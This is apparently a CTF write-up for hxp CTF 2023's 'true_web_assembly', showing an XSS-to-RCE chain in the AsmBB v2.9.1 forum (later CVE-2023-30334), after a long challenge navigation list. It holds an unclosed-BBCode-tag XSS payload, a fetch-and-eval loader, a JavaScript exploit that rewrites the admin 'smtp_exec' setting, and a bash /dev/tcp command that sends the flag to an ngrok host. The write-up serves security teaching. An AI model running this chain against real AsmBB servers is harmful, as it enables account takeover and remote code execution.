    - [Document-Converter](/2022/securinets-ctf-quals-2022/document-converter)
    - [PlanetSheet](/2022/securinets-ctf-quals-2022/planetsheet)
    - [NarutoKeeper](/2022/securinets-ctf-quals-2022/narutokeeper)
  + [CTF.SG CTF](/2022/ctf.sg-ctf)
    - [Asuna Waffles](/2022/ctf.sg-ctf/asuna-waffles)
    - [Senpai](/2022/ctf.sg-ctf/senpai)
    - [We know this all too well](/2022/ctf.sg-ctf/we-know-this-all-too-well)
    - [Don't Touch My Flag](/2022/ctf.sg-ctf/dont-touch-my-flag)
    - [Wildest Dreams Part 2](/2022/ctf.sg-ctf/wildest-dreams-part-2)
    - [Chopsticks](/2022/ctf.sg-ctf/chopsticks)
  + [YaCTF 2022](/2022/yactf-2022)
    - [Shiba](/2022/yactf-2022/shiba)
    - [Flag Market](/2022/yactf-2022/flag-market)
    - [Pasteless](/2022/yactf-2022/pasteless)
    - [Secretive](/2022/yactf-2022/secretive)
    - [MetaPDF](/2022/yactf-2022/metapdf)
    - [Crackme](/2022/yactf-2022/crackme)
  + [DiceCTF 2022](/2022/dicectf-2022)
    - [knock-knock](/2022/dicectf-2022/knock-knock)
    - [blazingfast](/2022/dicectf-2022/blazingfast)
  + [TetCTF 2022](/2022/tetctf-2022)
    - [2X-Service](/2022/tetctf-2022/2x-service)
    - [Animals](/2022/tetctf-2022/animals)
    - [Ezflag Level 1](/2022/tetctf-2022/ezflag-level-1)
* 2021
  + [hxp CTF 2021](/2021/hxp-ctf-2021)
  + [HTX Investigator's Challenge 2021](/2021/htx-investigators-challenge-2021)
  + [Metasploit Community CTF](/2021/metasploit-community-ctf)
  + [MetaCTF CyberGames](/2021/metactf-cybergames)
    - [Look, if you had one shot](/2021/metactf-cybergames/look-if-you-had-one-shot)
    - [Custom Blog](/2021/metactf-cybergames/custom-blog)
    - [Yummy Vegetables](/2021/metactf-cybergames/yummy-vegetables)
    - [Ransomware Patch](/2021/metactf-cybergames/ransomware-patch)
    - [I Hate Python](/2021/metactf-cybergames/i-hate-python)
    - [Interception](/2021/metactf-cybergames/interception)
  + [CyberSecurityRumble CTF](/2021/cybersecurityrumble-ctf)
    - [Lukas App](/2021/cybersecurityrumble-ctf/lukas-app)
    - [Finance Calculat0r 2021](/2021/cybersecurityrumble-ctf/finance-calculat0r-2021)
    - [Personal Encryptor with Nonbreakable Inforation-theoretic Security](/2021/cybersecurityrumble-ctf/personal-encryptor-with-nonbreakable-inforation-theoretic-security)
    - [Enterprice File Sharing](/2021/cybersecurityrumble-ctf/enterprice-file-sharing)
    - [Payback](/2021/cybersecurityrumble-ctf/payback)
    - [Stonks Street Journal](/2021/cybersecurityrumble-ctf/stonks-street-journal)
  + [The InfoSecurity Challenge (TISC) 2021](/2021/the-infosecurity-challenge-tisc-2021)
    - [Level 4 - The Magician's Den](/2021/the-infosecurity-challenge-tisc-2021/level-4-the-magicians-den)
    - [Level 3 - Needle in a Greystack](/2021/the-infosecurity-challenge-tisc-2021/level-3-needle-in-a-greystack)
    - [Level 2 - Dee Na Saw as a need](/2021/the-infosecurity-challenge-tisc-2021/level-2-dee-na-saw-as-a-need)
    - [Level 1 - Scratching the Surface](/2021/the-infosecurity-challenge-tisc-2021/level-1-scratching-the-surface)
  + [SPbCTF's Student CTF Quals](/2021/spbctfs-student-ctf-quals)
    - [31 Line PHP](/2021/spbctfs-student-ctf-quals/31-line-php)
    - [BLT](/2021/spbctfs-student-ctf-quals/blt)
    - [CatStep](/2021/spbctfs-student-ctf-quals/catstep)
  + [Asian Cyber Security Challenge (ACSC) 2021](/2021/asian-cyber-security-challenge-acsc-2021)
    - [Cowsay As A Service](/2021/asian-cyber-security-challenge-acsc-2021/cowsay-as-a-service)
    - [Favorite Emojis](/2021/asian-cyber-security-challenge-acsc-2021/favorite-emojis)
    - [Baby Developer](/2021/asian-cyber-security-challenge-acsc-2021/baby-developer)
    - [API](/2021/asian-cyber-security-challenge-acsc-2021/api)
    - [RSA Stream](/2021/asian-cyber-security-challenge-acsc-2021/rsa-stream)
    - [Filtered](/2021/asian-cyber-security-challenge-acsc-2021/filtered)
    - [NYONG Coin](/2021/asian-cyber-security-challenge-acsc-2021/nyong-coin)
  + [CSAW CTF Qualification Round 2021](/2021/csaw-ctf-qualification-round-2021)
    - [Save the Tristate](/2021/csaw-ctf-qualification-round-2021/save-the-tristate)
    - [securinotes](/2021/csaw-ctf-qualification-round-2021/securinotes)
    - [no pass needed](/2021/csaw-ctf-qualification-round-2021/no-pass-needed)
    - [Gatekeeping](/2021/csaw-ctf-qualification-round-2021/gatekeeping)
    - [Ninja](/2021/csaw-ctf-qualification-round-2021/ninja)
  + [YauzaCTF 2021](/2021/yauzactf-2021)
    - [Yauzacraft Pt. 2](/2021/yauzactf-2021/yauzacraft-pt.-2)
    - [Yauzabomber](/2021/yauzactf-2021/yauzabomber)
    - [RISC 8bit CPU](/2021/yauzactf-2021/risc-8bit-cpu)
    - [ARC6969 Pt. 1](/2021/yauzactf-2021/arc6969-pt.-1)
    - [ARC6969 Pt. 2](/2021/yauzactf-2021/arc6969-pt.-2)
    - [Back in 1986 - User](/2021/yauzactf-2021/back-in-1986-user)
    - [Lorem-Ipsum](/2021/yauzactf-2021/lorem-ipsum)
  + [InCTF 2021](/2021/inctf-2021)
    - [Notepad 1 - Snakehole's Secret](/2021/inctf-2021/notepad-1-snakeholes-secret)
    - [RaaS](/2021/inctf-2021/raas)
    - [MD Notes](/2021/inctf-2021/md-notes)
    - [Shell Boi](/2021/inctf-2021/shell-boi)
    - [Listen](/2021/inctf-2021/listen)
    - [Ermittlung](/2021/inctf-2021/ermittlung)
    - [Alpha Pie](/2021/inctf-2021/alpha-pie)
  + [UIUCTF 2021](/2021/uiuctf-2021)
    - [pwnies\_please](/2021/uiuctf-2021/pwnies_please)
    - [yana](/2021/uiuctf-2021/yana)
    - [ponydb](/2021/uiuctf-2021/ponydb)
    - [SUPER](/2021/uiuctf-2021/super)
    - [Q-Rious Transmissions](/2021/uiuctf-2021/q-rious-transmissions)
    - [capture the :flag:](/2021/uiuctf-2021/capture-the-flag)
    - [back\_to\_basics](/2021/uiuctf-2021/back_to_basics)
    - [buy\_buy\_buy](/2021/uiuctf-2021/buy_buy_buy)
  + [Google CTF 2021](/2021/google-ctf-2021)
    - [CPP](/2021/google-ctf-2021/cpp)
    - [Filestore](/2021/google-ctf-2021/filestore)
  + [TyphoonCon CTF 2021](/2021/typhooncon-ctf-2021)
    - [Clubmouse](/2021/typhooncon-ctf-2021/clubmouse)
    - [Impasse](/2021/typhooncon-ctf-2021/impasse)
  + [DSTA BrainHack CDDC21](/2021/dsta-brainhack-cddc21)
    - [File It Away (Pwn)](/2021/dsta-brainhack-cddc21/file-it-away-pwn)
    - [Linux Rules the World! (Linux)](/2021/dsta-brainhack-cddc21/linux-rules-the-world-linux)
    - [Going Active (Reconnaissance)](/2021/dsta-brainhack-cddc21/going-active-reconnaissance)
    - [Behind the Mask (Windows)](/2021/dsta-brainhack-cddc21/behind-the-mask-windows)
    - [Web Takedown Episode 2 (Web)](/2021/dsta-brainhack-cddc21/web-takedown-episode-2-web)
    - [Break it Down (Crypto)](/2021/dsta-brainhack-cddc21/break-it-down-crypto)
  + [BCACTF 2.0](/2021/bcactf-2.0)
    - [L10N Poll](/2021/bcactf-2.0/l10n-poll)
    - [Challenge Checker](/2021/bcactf-2.0/challenge-checker)
    - [Discrete Mathematics](/2021/bcactf-2.0/discrete-mathematics)
    - [Advanced Math Analysis](/2021/bcactf-2.0/advanced-math-analysis)
    - [Math Analysis](/2021/bcactf-2.0/math-analysis)
    - [American Literature](/2021/bcactf-2.0/american-literature)
    - [More Than Meets the Eye](/2021/bcactf-2.0/more-than-meets-the-eye)
    - [􃗁􌲔􇺟􊸉􁫞􄺷􄧻􃄏􊸉](/2021/bcactf-2.0/undefined)
  + [Zh3ro CTF V2](/2021/zh3ro-ctf-v2)
    - [Chaos](/2021/zh3ro-ctf-v2/chaos)
    - [Twist and Shout](/2021/zh3ro-ctf-v2/twist-and-shout)
    - [1n\_jection](/2021/zh3ro-ctf-v2/1n_jection)
    - [alice\_bob\_dave](/2021/zh3ro-ctf-v2/alice_bob_dave)
    - [Baby SSRF](/2021/zh3ro-ctf-v2/baby-ssrf)
    - [bxxs](/2021/zh3ro-ctf-v2/bxxs)
    - [Sparta](/2021/zh3ro-ctf-v2/sparta)
  + [Pwn2Win CTF 2021](/2021/pwn2win-ctf-2021)
    - [C'mon See My Vulns](/2021/pwn2win-ctf-2021/cmon-see-my-vulns)
    - [Illusion](/2021/pwn2win-ctf-2021/illusion)
  + [NorzhCTF 2021](/2021/norzhctf-2021)
    - [Leet Computer](/2021/norzhctf-2021/leet-computer)
    - [Secure Auth v0](/2021/norzhctf-2021/secure-auth-v0)
    - [Triskel 3: Dead End](/2021/norzhctf-2021/triskel-3-dead-end)
    - [Triskel 2: Going In](/2021/norzhctf-2021/triskel-2-going-in)
    - [Triskel 1: First Contact](/2021/norzhctf-2021/triskel-1-first-contact)
    - [Discovery](/2021/norzhctf-2021/discovery)
  + [DawgCTF 2021](/2021/dawgctf-2021)
    - [Bofit](/2021/dawgctf-2021/bofit)
    - [Jellyspotters](/2021/dawgctf-2021/jellyspotters)
    - [No Step On Snek](/2021/dawgctf-2021/no-step-on-snek)
    - [Back to the Lab 2](/2021/dawgctf-2021/back-to-the-lab-2)
    - [MDL Considered Harmful](/2021/dawgctf-2021/mdl-considered-harmful)
    - [Really Secure Algorithm](/2021/dawgctf-2021/really-secure-algorithm)
    - [The Obligatory RSA Challenge](/2021/dawgctf-2021/the-obligatory-rsa-challenge)
    - [Trash Chain](/2021/dawgctf-2021/trash-chain)
    - [What the Flip?!](/2021/dawgctf-2021/what-the-flip)
    - [Back to the Lab 1](/2021/dawgctf-2021/back-to-the-lab-1)
    - [Back to the Lab 3](/2021/dawgctf-2021/back-to-the-lab-3)
    - [Dr. Hrabowski's Great Adventure](/2021/dawgctf-2021/dr.-hrabowskis-great-adventure)
    - [Just a Comment](/2021/dawgctf-2021/just-a-comment)
    - [Baby's First Modulation](/2021/dawgctf-2021/babys-first-modulation)
    - [Two Truths and a Fib](/2021/dawgctf-2021/two-truths-and-a-fib)
  + [UMDCTF 2021](/2021/umdctf-2021)
    - [Advantageous Adventures](/2021/umdctf-2021/advantageous-adventures)
    - [Roy's Randomness](/2021/umdctf-2021/roys-randomness)
    - [Whose Base Is It Anyway](/2021/umdctf-2021/whose-base-is-it-anyway)
    - [Cards Galore](/2021/umdctf-2021/cards-galore)
    - [Pretty Dumb File](/2021/umdctf-2021/pretty-dumb-file)
    - [Minetest](/2021/umdctf-2021/minetest)
    - [Donnie Docker](/2021/umdctf-2021/donnie-docker)
    - [Subway](/2021/umdctf-2021/subway)
    - [Jump Not Easy](/2021/umdctf-2021/jump-not-easy)
    - [To Be XOR Not To Be](/2021/umdctf-2021/to-be-xor-not-to-be)
    - [Office Secrets](/2021/umdctf-2021/office-secrets)
    - [L33t M4th](/2021/umdctf-2021/l33t-m4th)
    - [Bomb 2 - Mix Up](/2021/umdctf-2021/bomb-2-mix-up)
    - [Jay](/2021/umdctf-2021/jay)
  + [Midnight Sun CTF 2021](/2021/midnight-sun-ctf)
    - [Corporate MFA](/2021/midnight-sun-ctf/corporate-mfa)
    - [Gurkburk](/2021/midnight-sun-ctf/gurkburk)
    - [Backups](/2021/midnight-sun-ctf/backups)
  + [picoCTF 2021](/2021/picoctf)
    - [It Is My Birthday (100)](/2021/picoctf/it-is-my-birthday-100)
    - [Super Serial (130)](/2021/picoctf/super-serial-130)
    - [Most Cookies (150)](/2021/picoctf/most-cookies-150)
    - [Startup Company (180)](/2021/picoctf/startup-company-180)
    - [X marks the spot (250)](/2021/picoctf/x-marks-the-spot-250)
    - [Web Gauntlet (170 + 300)](/2021/picoctf/web-gauntlet-170-%2B-300)
    - [Easy Peasy (40)](/2021/picoctf/easy-peasy-40)
    - [Mini RSA (70)](/2021/picoctf/mini-rsa-70)
    - [Dachshund Attacks (80)](/2021/picoctf/dachshund-attacks-80)
    - [No Padding, No Problem (90)](/2021/picoctf/no-padding-no-problem-90)
    - [Trivial Flag Transfer Protocol (90)](/2021/picoctf/trivial-flag-transfer-protocol-90)
    - [Wireshark twoo twooo two twoo... (100)](/2021/picoctf/wireshark-twoo-twooo-two-twoo...-100)
    - [Disk, Disk, Sleuth! (110 + 130)](/2021/picoctf/disk-disk-sleuth-110-%2B-130)
    - [Stonks (20)](/2021/picoctf/stonks-20)
  + [DSO-NUS CTF 2021](/2021/dso-nus-ctf)
    - [Insecure (100)](/2021/dso-nus-ctf/insecure-100)
    - [Easy SQL (200)](/2021/dso-nus-ctf/easy-sql-200)

[Powered by GitBook](https://www.gitbook.com/?utm_source=content&utm_medium=trademark&utm_campaign=-MX1bWRlBzHpEPe1TYDD)On this page

Was this helpful?

1. [2023](/2023)
3. [hxp CTF](/2023/hxp-ctf)
# true\_web\_assembly

From XSS to RCE in AsmBB v2.9.1

## Update (May 2023)

This vulnerability was assigned a CVE!

> [**CVE-2023-30334**](https://nvd.nist.gov/vuln/detail/CVE-2023-30334)
> AsmBB v2.9.1 was discovered to contain multiple cross-site scripting (XSS) vulnerabilities via the MiniMag.asm and bbcode.asm libraries.

## Description

> <https://board.asm32.info/asmbb-v2-9-has-been-released.328/>
>
> From the post:
>
> * “AsmBB is very secure web application, because of the internal design and the reduced dependencies. But it also supports encrypted databases, for even higher security.”
> * “Download, install and hack”
>
> Yes

## Solution

The challenge is to attack the latest version of [AsmBB](https://asm32.info/fossil/asmbb/index), a web-based message board implemented entirely in x86 assembly. The provided Dockerfile builds the `asmbb` engine using the source files from the `asmbb` and `freshlib` repositories.

Copy
```
# Get source files for asmbb
RUN wget https://asm32.info/fossil/asmbb/tarball/4c91cddaec/asmbb-4c91cddaec.tar.gz -O asmbb.tar.gz && \
	/bin/bash -c "echo 'b1e621d1ae988b35e836ec9142ccc6ce6cf7c24a090c4d973894770a62fa4ddc asmbb.tar.gz' | sha256sum --check" && \
	tar -xf asmbb.tar.gz || true && \
	mv asmbb-* asmbb
# Get source files for freshlib
# AsmBB uses functions from freshlib
RUN wget https://fresh.flatassembler.net/fossil/repo/fresh/tarball/6636a57441/Fresh+IDE-6636a57441.tar.gz -O fresh.tar.gz && \
	/bin/bash -c "echo '5ba395b0e957536bd66abc572414085aab5f2a527d28214881bbba72ec53e00d fresh.tar.gz' | sha256sum --check" && \
	tar -xf fresh.tar.gz && \
	mv Fresh* Fresh
# Build the asmbb engine
RUN lib=/Fresh/freshlib TargetOS=Linux /fasm/fasm -m 200000 /asmbb/source/engine.asm /engine
```
## Gaining XSS

The forum is the main feature of AsmBB, and the default build uses a custom markdown-like parser called MiniMag. Our goal is to achieve a GET-based XSS on the admin user, and subsequently abuse admin features for RCE.

Let's take a look at the AsmBB [source](https://asm32.info/fossil/asmbb). [`render2.asm`](https://asm32.info/fossil/asmbb/file?name=source/render2.asm&ci=4c91cddaec90fb74) contains a "hash table" of commands used by the templating engine, mapped to their routines.

Copy
```
PHashTable tableRenderCmd, tpl_func,                      \
        'special:',     RenderTemplate.cmd_special,       \
        'raw:',         RenderTemplate.cmd_raw,           \
        'include:',     RenderTemplate.cmd_include,       \
        'minimag:',     RenderTemplate.cmd_minimag,       \   ; HTML, no encoding.
        'bbcode:',      RenderTemplate.cmd_bbcode,        \   ; HTML, no encoding.
        'html:',        RenderTemplate.cmd_html,          \   ; HTML, disables the encoding.
        'attachments:', RenderTemplate.cmd_attachments,   \   ; HTML, no encoding.
        'attach_edit:', RenderTemplate.cmd_attachedit,    \   ; HTML, no encoding.
        'url:',         RenderTemplate.cmd_url,           \   ; Needs encoding!
        'json:',        RenderTemplate.cmd_json,          \   ; No encoding.
        'css:',         RenderTemplate.cmd_css,           \   ; No output, no encoding.
        'equ:',         RenderTemplate.cmd_equ,           \
        'const:',       RenderTemplate.cmd_const,         \
        'enc:',         RenderTemplate.cmd_encode,        \   ; encode the content in html encoding.
        'usr:',         RenderTemplate.cmd_user_encode    \   ; encodes the unicode content of the user nickname for unicode-clones distinction.
```

We can see this in action in [`post_view.tpl`](https://asm32.info/fossil/asmbb/file?name=www/templates/Urban+Sunrise/post_view.tpl&ci=4c91cddaec90fb74) where the post is rendered. Depending on `format`, the post content is either parsed with `minimag` or `bbcode`, and the final output is rendered as HTML.

Copy
```
<article class="post-text">
  [html:[[case:[format]|minimag:[include:minimag_suffix.tpl]|bbcode:][Content]]]
</article>
```

Although the client-side UI only allows us to write content in the MiniMag format, the POST request to submit the post does include a `format` parameter.

Copy
```
POST /!post HTTP/1.1
Host: localhost:9032
Content-Length: 917
...
Connection: close
...
------WebKitFormBoundarydKCsA6RKHAepAWPn
Content-Disposition: form-data; name="format"
0
------WebKitFormBoundarydKCsA6RKHAepAWPn
Content-Disposition: form-data; name="source"
[http://example.com][My link]
------WebKitFormBoundarydKCsA6RKHAepAWPn--
```

When set to 1, the `format` parameter allows us to use the [BBCode](https://en.wikipedia.org/wiki/BBCode) parser instead. This uses the `bbcode` command, which calls the `.cmd_bbcode` routine.

Copy
```
.cmd_bbcode:
; here esi points to ":" of the "bbcode:" command. edi points to the start "[" and ecx points to the end "]"
locals
  BenchVar .bbcode_time
endl
        BenchmarkStart .bbcode_time
        stdcall TextMoveGap, edx, ecx
        stdcall TextSetGapSize, edx, 4
        mov     dword [edx+ecx], 0
        add     [edx+TText.GapBegin], 4
        inc     [edx+TText.GapEnd]              ; delete the end "]"
        stdcall TextMoveGap, edx, edi
        add     [edx+TText.GapEnd], 8
        stdcall TranslateBBCode, edx, edi, SanitizeURL

        ...
```

Since the BBCode parser was a [newer](https://board.asm32.info/the-latest-update-of-this-forum.258/) parser introduced after MiniMag, and isn't enabled by default, we thought this would be the best place to start looking for parser vulnerabilities.

The `TranslateBBCode` routine from [`bbcode.asm`](https://fresh.flatassembler.net/fossil/repo/fresh/artifact/0457fbe206805cbe) (found in [FreshLib](https://fresh.flatassembler.net/fossil/repo/fresh)) is then used to parse the BBCode content. Here we see a table of supported BBCode tags.

Copy
```
PHashTable tableBBtags, tpl_func,                      \
        'b',       tagStrong,                          \
        '*',       tagListItem,                        \
        'i',       tagEm,                              \
        'u',       tagUnderlined,                      \
        's',       tagDel,                             \
        'c',       tagInlineCode,                      \
        'url',     tagURL,                             \
        'img',     tagImg,                             \
        'quote',   tagQuote,                           \

        ...
```

BBCode is an old markup language that has a rather simple syntax. Tags are enclosed by square brackets, and some tags can have attributes, such as the following URL tag:

Copy
```
[url=https://example.com]My link[/url]
```

The main loop of the parser is found at `.loop`. For each character, the logic goes:

* if the end of the text has been reached, exit the loop
* if it is a newline or space character, skip it
* if it is `[`, process the tag at `.start_tag`
* if it is the start of an emoji, process the emoji

Copy
```
.loop:
        mov     ecx, [edx+TText.GapEnd]
        cmp     ebx, [edx+TText.GapBegin]
        cmovb   ecx, [edx+TText.GapBegin]
        sub     ecx, [edx+TText.GapBegin]
        add     ecx, ebx
        cmp     ecx, [edx+TText.Length]
        jae     .end_of_text

        movzx   eax, byte [edx+ecx]
        test    al, al
        jz      .end_of_text
        cmp     al, $0d
        je      .new_line
        cmp     al, $0a
        je      .new_line
        cmp     al, $20
        jbe     .next           ; skip all whitespace
        ...
.paragraph_ok:
        cmp     al, "["
        je      .start_tag
; here check for emoticons
        cmp     al, $f0         ; emoji?
        jb      .continue

        ...
```

Otherwise, we go to `.continue`, where the character is HTML encoded.

Copy
```
.continue:
; html encoding from here
        test    al, al          ; all values > 127 are unicode and should not be encoded.
        js      .next
        movzx   eax, byte [tbl_html+eax]
        test    al, al
        jz      .del_char
        jns     .next           ; the same as above
        lea     esi, [eax+tbl_html]     ; the address of the replacement string.
        lodsb
        movzx   ecx, al         ; length
; insert the replacement html encoding from esi
        stdcall TextMoveGap, edx, ebx
        stdcall TextSetGapSize, edx, ecx
        inc     [edx+TText.GapEnd]      ; delete the previous char.
        mov     edi, [edx+TText.GapBegin]
        add     edi, edx
        add     [edx+TText.GapBegin], ecx
        add     ebx, ecx
        rep movsb
        jmp     .loop
```

Notice that unless the current character is part of an emoji or part of an opening/closing tag, we will reach the HTML-encoding logic. This is done through a simple text substitution that sanitizes angle brackets, quotes, and ampersands.

Copy
```
HtmlEntities tbl_html,        \
  $09, $0d,                   \
  $0a, $0a,                   \
  $0d, $0d,                   \
  '<', '&lt;',                \
  '>', '&gt;',                \
  '"', '&quot;',              \
  "'", '&apos;',              \
  '&', '&amp;'
```

Since everything outside the opening/closing tag are HTML-encoded, let's take a closer look at the tag-processing logic. When a tag is matched, a string substitution is performed based on the table below.

Copy
```
...
tagImg          onetag <txt '<img class="block"', HTML_IMG_ATTR, 'alt="'>, txt '" src="',  txt '" />',         fBlockTag  or fDisableTags or fURLContent
tagInlineImg    onetag <txt '<img class="inline"', HTML_IMG_ATTR,'alt="'>, txt '" src="',  txt '" />',         fInlineTag or fDisableTags or fURLContent
tagSize         onetag txt '<span style="font-size:',               txt '">',       txt '</span>',      fInlineTag
tagColor        onetag txt '<span style="color:',                   txt '">',       txt '</span>',      fInlineTag
tagEmail        onetag txt '<a href="mailto:',                      txt '">',       txt '</a>',         0
...
```

The 2nd, 3rd, and 4th columns correspond to the start of the tag, end of the attribute, and end of the tag respectively. For instance, the following markup

Copy
```
[email=example@example.com]Click Here[/email]
```

becomes

Copy
```
<a href="mailto: + example@example.com + "> + Click Here + </a>
```

The attribute value and the content in between the opening/closing tags are processed separately from the tag itself, and are thus subject to HTML-encoding. If there's any parsing bug to be found, it would probably have to be while parsing the tag.

*What if we just don't close the tag?*

Since the tag isn't being encoded while it is processed, there might be an edge case where the unencoded content is reflected in the absence of a closing `]`.

*Voilà*, the following markup

Copy
```
[email=<img src=x onerror=alert()
```

translates to

Copy
```
<a href="mailto:&lt;img src=x onerror=alert() "><img src=x onerror=alert() </a>
```

which when rendered on a browser, pops an alert!

## Honourable Mentions

We also found two POST-based XSS vectors, which unfortunately were unusable in this challenge in the absence of an open redirect (since the admin bot is only able to visit the challenge page, and no other page).

The first was a POST request to `!post`. This would have reflected the XSS payload in the page `<title>`.

Copy
```
<html>
  <body>
    <form action="http://localhost:9032/!post" method="POST">
      <input type="hidden" name="attach" value="" />
      <input type="hidden" name="format" value="0" />
      <input type="hidden" name="invited" value="1" />
      <input type="hidden" name="limited" value="1" />
      <input type="hidden" name="preview" value="p" />
      <input type="hidden" name="source" value="foo" />
      <input type="hidden" name="tabselector" value="0" />
      <input type="hidden" name="tags" value="17" />
      <input type="hidden" name="ticket" value="foo" />
      <input type="hidden" name="title" value="e&lt;&#47;title&gt;&lt;script&gt;alert&#40;origin&#41;&lt;&#47;script&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

The second is a HTTP response splitting attack. The `!skincookie` endpoint reflects form data in the `Set-Cookie` header, and allows for for CRLF injection. In addition to XSS, this can be used to set arbitrary cookies and response headers.

## Gaining RCE

Armed with admin privileges, one would see a suspiciously named setting in `/!settings`.

A setting called "Pipe the emails through" sure sounds promising for RCE. Looking for the form key `smtp_exec` shows us that this option is being used in [`commands.asm`](https://asm32.info/fossil/asmbb/file?name=source/commands.asm&ci=4c91cddaec90fb74) when sending a user activation email.

Copy
```
proc SendActivationEmail, .stmt
.stmt2     dd ?
.subj      dd ?
.body      dd ?
.host      dd ?
.from      dd ?
.to        dd ?
.smtp_addr dd ?
.smtp_port dd ?
.exec      dd ?
begin

        ...
        xor     eax, eax
        stdcall GetParam, txt "smtp_exec", gpString
        mov     [.exec], eax
        test    eax, eax
        jnz     .addresses_ok
        ...
; send by external program.
        stdcall CreatePipe
        mov     ebx, eax
        stdcall FileWriteString, edx, txt "From: "
        stdcall FileWriteString, edx, [.from]
        stdcall FileWriteString, edx, txt "@"
        stdcall FileWriteString, edx, [.host]
        stdcall FileWriteString, edx, <txt 13, 10>
        stdcall FileWriteString, edx, txt "To: "
        stdcall FileWriteString, edx, [.to]
        stdcall FileWriteString, edx, <txt 13, 10>
        stdcall FileWriteString, edx, txt "Subject: "
        stdcall FileWriteString, edx, [.subj]
        stdcall FileWriteString, edx, <txt 13, 10>
        stdcall FileWriteString, edx, [.body]
        stdcall FileWriteString, edx, <txt 13, 10>
        stdcall FileClose, edx
        stdcall Exec2, [.exec], ebx, [STDOUT], [STDERR]
        stdcall WaitProcessExit, eax, -1
        stdcall FileClose, ebx
        clc
        jmp     .finish
```

Looks like our `smtp_exec` option is being passed to `Exec2`. A quick look at [`process.asm`](https://fresh.flatassembler.net/fossil/repo/fresh/artifact/6e99edc24ea48311) reveals that this spawns a child process with our input. Great!

Copy
```
body Exec2
.pArgs dd ?
begin
        pushad
        stdcall StrSplitArg, [.hCommand]
        mov     [.pArgs], eax
        mov     eax, sys_fork
        int     $80
        test    eax, eax
        jnz     .parent         ; this is the parent process
; here is the child.
        DebugMsg "Child process here!"

        ...
```

All we have to do now is to change this option to a payload that sends us the flag.

Copy
```
/bin/bash -c /readflag>/dev/tcp/0.tcp.ngrok.io/11818
```
## Putting It All Together

Here's the final exploit that we will serve to the admin. Here, I used a first-stage payload to keep the exploit small, but serving the whole exploit in one payload would work as well.

Copy
```
fetch("http://HOST:PORT/exploit.js").then(r=>r.text()).then(eval)
```

is converted to base64 and eval-ed:

Copy
```
[color=<img src=x onerror=eval(atob('ZmV0 ... bCk='))
```

which then executes the RCE payload:

Copy
```
const rce = (smtp_exec, ticket) => {
    fetch(`${window.origin}/!settings`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `forum_title=&forum_header=%3Ch1+style%3D%22font-weight%3A+800%22%3EAsmBB%3C%2Fh1%3E%0D%0A%3Cb+style%3D%22text-align%3A+center%22%3EPower%3Cbr%3E%0D%0A%3Csvg+version%3D%221.1%22+width%3D%2264%22+height%3D%2216%22+viewBox%3D%220+0+64+16%22+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0D%0A+%3Cpath+d%3D%22m0+6+8+10h34l-6-6+28-2-50-8+8+8z%22%2F%3E%0D%0A%3C%2Fsvg%3E%0D%0A%3C%2Fb%3E%0D%0A&description=&keywords=&tabselector=1&host=asdf&smtp_addr=asdf&smtp_port=25`
            + `&smtp_exec=${smtp_exec}&smtp_user=asdf&email_confirm=on&user_perm=1&user_perm=2&user_perm=4&user_perm=8&user_perm=16&user_perm=64&user_perm=256&user_perm=512&user_perm=1024&post_interval=0&post_interval_inc=0&max_post_length=0&anon_perm=1&anon_perm=2&activate_min_interval=0&default_lang=0&page_length=20&default_skin=Urban+Sunrise&default_mobile_skin=Urban+Sunrise&chat_enabled=on&markups=1&password=`
            + `&ticket=${ticket}&save=Save`
    })
}
const smtp_exec = encodeURIComponent("/bin/bash -c /readflag>/dev/tcp/HOST/PORT")
fetch(`${window.origin}/!settings`)
    .then(response => response.text())
    .then(text => {
        const m = text.match(/name="ticket" value="([^"]+)"/);
        console.log(m);
        if (m) {
            const ticket = m[1];
            rce(smtp_exec, ticket)
        }
    });
```

Once the admin visits our exploit page, just register a new user and the flag will be sent to us!

Copy
```
$ nc -lv 1337
hxp{iTs_f4s7_iT$_sM4lL_NoB0d1_c4n_br3aK_!t_1f_n0b0dY_c4n_r3ad_i7}
```
[Previoushxp CTF](/2023/hxp-ctf)[NextHackTM CTF Qualifiers](/2023/hacktm-ctf-qualifiers)

Last updated 1 year ago

* [Update (May 2023)](#update-may-2023)
* [Description](#description)
* [Solution](#solution)
* [Gaining XSS](#gaining-xss)
* [Honourable Mentions](#honourable-mentions)
* [Gaining RCE](#gaining-rce)
* [Putting It All Together](#putting-it-all-together)
![](https://ctf.zeyu2001.com/~gitbook/image?url=https%3A%2F%2F3167364547-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MX1bWRlBzHpEPe1TYDD%252Fuploads%252F68XhJHCYPUdXGYVm1Ry7%252FScreenshot%25202023-03-12%2520at%252010.18.45%2520PM.png%3Falt%3Dmedia%26token%3Db2dc1599-201a-461a-ace3-dec6091fb34f&width=768&dpr=4&quality=100&sign=f053953a&sv=2)![](https://ctf.zeyu2001.com/~gitbook/image?url=https%3A%2F%2F3167364547-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MX1bWRlBzHpEPe1TYDD%252Fuploads%252FyRYoRV8rNiL9h09cmEJK%252FScreenshot%25202023-03-13%2520at%25209.59.13%2520PM.png%3Falt%3Dmedia%26token%3D51ba7430-c71d-4edf-b5af-67c17a3fd0b6&width=768&dpr=4&quality=100&sign=5757edc1&sv=2)![](https://ctf.zeyu2001.com/~gitbook/image?url=https%3A%2F%2F3167364547-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MX1bWRlBzHpEPe1TYDD%252Fuploads%252FEVOxgDqNHz6veSDmHrCB%252FScreenshot%25202023-03-13%2520at%252010.03.35%2520PM.png%3Falt%3Dmedia%26token%3D5d4088b8-ef06-496f-969d-36a35c7b4d50&width=768&dpr=4&quality=100&sign=432b28df&sv=2)![](https://ctf.zeyu2001.com/~gitbook/image?url=https%3A%2F%2F3167364547-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MX1bWRlBzHpEPe1TYDD%252Fuploads%252FiwFmxGUGsWBhTVg6caLs%252FScreenshot%25202023-03-13%2520at%252010.14.38%2520PM.png%3Falt%3Dmedia%26token%3D26e7a5d1-f642-4f00-a48a-ddc37314d9bb&width=768&dpr=4&quality=100&sign=cbf32b39&s